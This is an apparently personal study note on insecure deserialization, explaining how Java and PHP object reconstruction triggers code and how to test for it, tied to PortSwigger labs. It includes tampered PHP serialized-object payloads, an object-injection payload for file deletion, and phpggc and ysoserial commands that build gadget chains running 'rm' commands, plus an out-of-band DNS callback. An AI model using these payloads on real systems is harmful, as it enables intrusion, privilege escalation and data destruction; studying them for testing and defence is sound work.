---
created: 2026-05-18
tags:
  - web_hacking
status: draft
---
## Serialization and deserialization

> **Serialization** is the process of converting an in-memory data structure or object into a linear byte stream or structured text representation that can be persisted (to disk or a database) or transmitted (over a network) and later reconstructed in the same — or a different — runtime environment.

- **Serialization** allows an application to freeze the state of a complex object (e.g., a `User`, a `Session`) and resurrect it later with the same fields, references, and class membership.

>**Deserialization** is the inverse process: parsing a serialized byte stream and reconstructing the original object graph, including class identities, field values, and any behavioral metadata that was preserved during serialization.

- There are three main categories of serialization formats:
	- **Text-based** — JSON, XML, YAML, CSV.
	- **Binary** — Java `ObjectOutputStream`, .NET `BinaryFormatter`, Python pickle.
	- **Hybrid/native** — PHP `serialize()`, Ruby `Marshal`.

- Formats that encode class information and invoke lifecycle methods (like Java, PHP, .NET native serializers) are inherently dangerous, because **the byte stream itself names classes for the runtime to instantiate and methods to invoke** for the object to be deserialized.
- JSON and XML ship only data, which makes them generally safe unless a wrapper layer (like `JsonConvert.DeserializeObject` with `TypeNameHandling.All`) reintroduces class binding.

> [!note] Deserialization is also called **unmarshalling**, **decoding**, or **unpickling** (Python).
## Insecure deserialization

>**Insecure deserialization** is a vulnerability that arises when an application deserializes user-controlled data, without first validating or restricting the type of object that may be reconstructing as well as its attributes. This allows the attacker to manipulate the state, class identity, or behavior of the resulting object graph.
 
> [!important]+ Classification
> 
> - Insecure Deserialization maps to:
>     - [`CWE-502: Deserialization of Untrusted Data`](https://cwe.mitre.org/data/definitions/502.html)

- The vulnerability allows you to manipulate serialized objects to change their state, attribute types, or values, or otherwise trigger unintended application behavior — including arbitrary code execution — during or after the deserialization process (often before the application even gets to inspect the object).
- **Object injection** is a specific class of insecure deserialization where you substitute the serialized payload with an object of a different class to invoke that foreign class's lifecycle methods.

#### Why the damage is done even before deserialization is finished

- When a runtime parses a serialized object, it does far more than just copy bytes into fields.
- In Java, the sequence is:
	1. `ObjectInputStream.readObject()` receives a user-controlled byte stream of the serialized object.
	2. The JVM reads class descriptors from the stream and *loads each class* via its `ClassLoader`. Static initializers (`<clinit>`) fire.
	3. The JVM then allocates memory and **creates an instance** of that class (**without** the public constructor running; the JVM uses a special path).
	4. If the class defines a private `readObject(ObjectInputStream)` method, it is invoked automatically. This method has full access to the stream and can execute any logic.
	5. If `readResolve()` is defined, it runs after `readObject()`.
	6. If the deserialized object is inserted into a hash-based collection encoded in the same stream, the collection calls `hashCode()` and `equals()` on it (both can potentially be exploited).
	7. Only after all this does control return to the application.

> [!important] The majority of deserialization exploits complete their work **before** `unserialize()`/`readObject()` returns. The application often never sees the malicious object as a usable value; the damage is done by the lifecycle hooks the runtime invokes during reconstruction. Validation that runs after the deserialization method returns is already too late.

>[!note] Ideally, user input should never be deserialized at all.
#### PHP deserialization in slow motion

- Consider this vulnerable PHP code:

```php
class Session {
    public $username;
    public $isAdmin;

    public function __wakeup() {
        $this->loadProfile();
    }

    private function loadProfile() {
        include "/var/profiles/" . $this->username . ".php";
    }
}

$cookie = base64_decode($_COOKIE['session']);
$session = unserialize($cookie);
if (!$session->isAdmin) {
    http_response_code(403);
    die("Not an admin");
}
```

- When you send a manipulated cookie where `$username = "../../../../tmp/payload"`, the events unfold as follows:

	1. The cookie is Base64-decoded and passed to `unserialize()`.
	2. `unserialize()` allocates a `Session` object and assigns it properties you defined.
	3. The runtime checks for `__unserialize()` (absent) and falls back to `__wakeup()`. `__wakeup()` is invoked.
	4. `__wakeup()` calls `loadProfile()`, which concatenates `$this->username` into an `include` path.
	5. The runtime includes and executes attacker-controlled PHP from `/tmp/payload.php`.
	6. **Only now does `unserialize()` return.** The application's `$session->isAdmin` check executes, but you have already achieved remote code execution.

- This is what _"the damage is done before deserialization is finished"_ means in practice. There is no place to insert a check after `unserialize()` that runs earlier than `__wakeup()` because `__wakeup()` runs inside `unserialize()` itself.

## Testing methodology

Follow a systematic workflow for testing insecure deserialization:

1. **Identify serialized data endpoints**: Look for session cookies, hidden form fields, `Authorization: Bearer` headers (non-JWT), Java `ViewState`, ASP.NET `__VIEWSTATE`, or cached objects.
2. **Capture and decode**: Peel away encoding layers (URL-decode, Base64-decode, gzip decompression).
3. **Fingerprint the format**: Identify whether the format is PHP, Java, .NET, Python, etc.
4. **Parse the structure**: Note the class name, every property, type tags, and length prefixes.
5. **Map fields to behavior**: Determine what the application does with each attribute (e.g., authorization, file paths).
6. **Choose an attack class**:
    - **Attribute tampering**: Change a boolean or value (e.g., `admin=true`).
    - **Type confusion**: Swap a string for an integer to abuse loose comparisons.
    - **Functional sink abuse**: Repoint a path/URL used by the application (e.g., `unlink($path)`).
    - **Arbitrary object injection**: Supply a different class that has a useful magic method.
    - **Library gadget chain**: Use prebuilt chains (e.g., via `phpggc` or `ysoserial`) to achieve RCE.
7. **Build and re-wrap the payload**: Recompute any length prefixes, re-apply encodings, and send the request.
8. **Observe**: Watch for out-of-band callbacks, stack traces (which leak class names), or state changes.

> [!tip] Errors are intelligence. For example, an PHP error showing `__PHP_Incomplete_Class_Name` means a class is missing; a Java `ClassNotFoundException` reveals what class the application expected.

- Tools:
	- [`frohoff/ysoserial`](https://github.com/frohoff/ysoserial)
- Burp Suite extensions:
	- [`NetSPI/JavaSerialKiller`](https://github.com/NetSPI/JavaSerialKiller)
	- [`federicodotta/Java Deserialization Scanner`](https://github.com/federicodotta/Java-Deserialization-Scanner)
	- [`summitt/burp-ysoserial`](https://github.com/summitt/burp-ysoserial)
	- [`DirectDefense/SuperSerial`](https://github.com/DirectDefense/SuperSerial)
	- [`DirectDefense/SuperSerial-Active`](https://github.com/DirectDefense/SuperSerial-Active)
- See also:
	- [`Java-Deserialization-Cheat-Sheet — GrrrDog, GitHub`](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
	- [`Java Unmarshaller Security - Turning your data into code execution — marshalsec/frohoff, GitHub`](https://github.com/frohoff/marshalsec)
### Serialization formats

| Format                    | Raw signature                          | Base64 signature                   | Other hints                                                                      |
| ------------------------- | -------------------------------------- | ---------------------------------- | -------------------------------------------------------------------------------- |
| PHP `serialize()`         | `O:` `a:` `s:` `i:` `b:` `N;`          | `Tzo` (for `O:`), `YTo` (for `a:`) | Often raw-readable; `Content-Type` rarely set                                    |
| Java `ObjectOutputStream` | `\xAC\xED\x00\x05`                     | `rO0AB`                            | `Content-Type: application/x-java-serialized-object`; gzip wrapper starts `H4sI` |
| .NET `BinaryFormatter`    | `\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF` | `AAEAAAD/////`                     | Often inside `__VIEWSTATE`                                                       |
| Python pickle             | `\x80\x04` / `\x80\x05`                | `gASV` / `gAUV`                    | Rare in web apps but seen in ML tools                                            |
| Ruby Marshal              | `\x04\x08`                             | `BAh`                              | Legacy Rails session cookies                                                     |

>[!note] See [`Comparison of data-serialization formats — Wikipedia`](https://en.wikipedia.org/wiki/Comparison_of_data-serialization_formats)/
## Attack classes

### Manipulating object attributes

- The simplest exploit involves altering attribute values; the rest of the class is left intact.

>[!example]+
> - In PHP, a serialized object looks like this:
> 	
> 	```php
> 	O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
> 	```
> 	
> 	- `O:4:"User":2:`: Object of class `User` (length 4) with 2 properties.
> 	- `s:8:"username";s:6:"wiener";`: String property `username` (length 8) with string value `wiener` (length 6).
> 	- `s:5:"admin";b:0;`: String property `admin` (length 5) with boolean value false (`0`).
> 
> - To escalate privileges, flip the boolean to `b:1;` and ensure any string length prefixes are updated if string values change.

>[!bug]+ Labs
>- [[🛠️ Insecure Deserialization labs#1. Modifying serialized objects]]

### Modifying data types (type confusion)

- If the application compares deserialized attributes with PHP's loose-equality operator `==`, the type tag is an attacker-controlled primitive.

- In PHP 7.x and earlier:
	- `0 == "abc"` evaluates to `true` (non-numeric string coerces to `0`).
	- `5 == "5abc"` evaluates to `true` (leading-numeric strings coerce to their integer prefix).

>[!example]+
> - If an application checks `$stored_token == $user->access_token`, then you can replace the expected string token with an integer `0` and bypass authentication.
>- Original object:
> ```php
> O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"token_string_here";}
>```
>- Exploit:
>```php
> O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
> ```

>![bug]+ Labs
>- [[🛠️ Insecure Deserialization labs#2. Modifying serialized data types]]
### Abusing application functionality (functional sinks)

- If an application uses a deserialized attribute in a sensitive operation, such as a file path for deletion, it can be exploited.

>[!example]+
> - Say, an object has an `avatar_link` attribute:
> 
> ```php
> O:4:"User":3:{s:8:"username";s:5:"gregg";s:11:"avatar_link";s:18:"users/gregg/avatar";}
> ```
> 
> - If the application calls `unlink($user->avatar_link)` upon account deletion, you can change the path to an arbitrary file (e.g., `/home/carlos/morale.txt`) and delete your account to remove the target file.

>![bug]+ Labs
>- [[🛠️ Insecure Deserialization labs#3. Using application functionality to exploit insecure deserialization]]

### Arbitrary object injection and magic methods

- In PHP, **magic methods** (starting with `__`) are invoked automatically during specific object lifecycle events.

| Magic method      | When it's triggered automatically                      |
| ----------------- | ------------------------------------------------------ |
| `__wakeup()`      | Immediately after `unserialize()`.                     |
| `__destruct()`    | When the object is destroyed (end of script if unset). |
| `__toString()`    | When the object is treated/echoed as a string.         |
| `__call()`        | When calling non-existent methods on the object.       |
| `__get()`         | When reading a non-existent property.                  |
| `__set()`         | When writing to a non-existent property.               |
| `__invoke()`      | When the object is called as a function (`$obj()`).    |
| `__unserialize()` | `unserialize()` is called (PHP 7.4+).                  |

- If a class in the application (even one not expected by the deserialization endpoint) contains a magic method that executes a dangerous sink (e.g., `eval`, `system`, `unlink`), you can inject that class instead of the expected one.

>[!example]+
> - Vulnerable class:
> 
> ```php
> class CustomTemplate {
>     private $lock_file_path;
>     public function __destruct() {
>         if (file_exists($this->lock_file_path)) {
>             unlink($this->lock_file_path);
>         }
>     }
> }
> ```
> - Payload to trigger arbitrary file deletion:
> 
> ```php
> O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/user/secret.txt";}
> ```

>[!bug]+ Labs
>- [[🛠️ Insecure Deserialization labs#4. Arbitrary object injection in PHP]].

## Gadget chains

>**Gadget** = A small piece of code (usually a method in a class) that performs a dangerous action when its parameters are under attacker control.

>**Gadget chain**, or a POP (Property Oriented Programming) chain = An ordered sequence of gadgets such that the first automatically triggers the next up in the chain, eventually leading to a sink (like RCE).

>[!note] To understand it better, a gadget chain can be compared to a domino. You push the first domino (entry point, the first gadget), it knocks over the second domino, which knocks the third, and so on. The last domino does what you want (say, executes `system("...")`).

- Instead of writing new code, you reuse existing code in the application's libraries — the gadgets — in an order never intended by the developers.

### PHP chains and PHPGGC

>[`PHPGGC`](https://github.com/ambionics/phpggc) (PHP Generic Gadget Chains) is a tool that generates serialized payloads for popular PHP frameworks.


- List available chains:

```bash
./phpggc -l
```

- Generate a Base64-encoded payload for Symfony RCE:

```bash
./phpggc -b Symfony/RCE system 'rm /home/user/secret.txt'
```

#### Fast-destruct and length-check bypass

- Applications may validate the deserialized object's structure and abort if it's incorrect. You can bypass this by appending unparseable trailing junk to the serialized object. 
- PHP's `unserialize()` will return `false` and skup the validation logic, but the partially constructed object will still immediately trigger `__destruct()` during garbage collection.

- Use the `-f` (fast-destruct) flag in PHPGGC:

```bash
./phpggc -b -f Symfony/RCE4 system 'rm /home/user/secret.txt'
```
### Java native serialization and ysoserial

>[`frohoff/ysoserial`](https://github.com/frohoff/ysoserial) is a tool for generating payloads that exploit unsafe Java object deserialization.

>[!note]+ To get `ysoserial` working, just download the JAR file and run it with `java -jar`:
>```bash
>java -jar ysoserial-all.jar
>```

>[!important] For Java 16 and above, you need to add extra command-line options (shown below) to allow `ysoserial` to access internal modules (due to Java’s module system restrictions).

- Generate a payload for Apache Commons Collections 4:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0
```

- To confirm vulnerability safely via OOB (Out-of-Band) interaction, you can use the `URLDNS` payload. It simply triggers a DNS lookup without executing any commands:

```bash
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar URLDNS 'http://<collaboarator_id>.oastify.com' | base64 -w0
```

### Other formats

- **.NET `BinaryFormatter`**: Exploited using [`ysoserial.net`](https://github.com/pwntester/ysoserial.net).
- **Python Pickle**: Inherently dangerous; `__reduce__()` allows arbitrary command execution without complex gadget chains.
- **Ruby Marshal**: Can be exploited via `_load` or `marshal_load` using documented gadget chains.
## References and further reading

- [`Insecure Deserialization — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [`Insecure deserialization — PortSwigger Web Security Academy`](https://portswigger.net/web-security/deserialization).
- [`Exploiting insecure deserialization vulnerabilities — PortSwigger Web Security Academy`](https://portswigger.net/web-security/deserialization/exploiting)
- [`Deserialization Cheat Sheet — OWASP Cheat Sheet Series`](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [`Insecure Deserialization — OWASP`](https://owasp.org/www-community/vulnerabilities/Insecure_Deserialization)
- [`Comparison of data-serialization formats — Wikipedia`](https://en.wikipedia.org/wiki/Comparison_of_data-serialization_formats)


- TODO: add more on PHPGGC and `ysoserial`.